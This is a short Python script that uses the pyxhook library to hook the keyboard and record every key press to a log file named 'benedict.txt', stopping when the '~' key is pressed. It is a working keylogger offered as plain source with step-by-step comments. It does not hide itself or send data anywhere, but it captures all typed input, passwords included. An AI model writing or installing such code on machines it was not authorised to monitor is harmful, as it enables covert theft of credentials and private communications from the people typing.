import logging
#Need Pyxhook for keyboard stream
import pyxhook
import time

#creates logger

#This function is called everytime a key is pressed
def kbevent(event):
	#print key info
	print event
	logging.basicConfig(filename='benedict.txt', level=logging.INFO)
	logging.info('%s', event)

	#If ~ key is engaged running returns false
	if event.Ascii == 126:
		global running
		running = False

#create hookmanager object
benedict = pyxhook.HookManager()

#Define our callback to fire when a key is pressed down
benedict.KeyDown = kbevent

#Hooks the Keyboard Stream
benedict.HookKeyboard()

#Starts the listener
benedict.start()

#the loop that keeps the app running
running = True
while running:
	time.sleep(0.1)

benedict.cancel()
